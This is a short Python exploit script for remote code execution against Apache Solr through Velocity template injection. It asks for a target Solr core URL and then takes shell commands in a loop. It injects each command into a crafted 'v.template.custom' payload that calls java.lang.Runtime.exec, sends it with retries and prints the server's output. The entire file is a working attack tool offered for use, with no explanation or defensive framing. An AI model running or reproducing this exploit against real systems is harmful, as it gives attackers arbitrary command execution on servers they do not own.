import requests
from urllib.parse import quote

url = input('[*]input url(eg:http://x.x.x.x:8983/solr/sore):')
#http://x.x.x.x:8983/solr/sore

while True:
	cmd = input('[*]input cmd:')
	cmd_url = quote(cmd)
	payload = url + f'/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27{cmd_url}%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end' 
	for i in range(10):
		try:
			restart = requests.get(payload,timeout = 5).text
			break
		except:
			pass
	else:
		print('[*]info: plase wite')
	print(f'[*]code"{cmd}"--restart\n{restart}')
	print(payload)

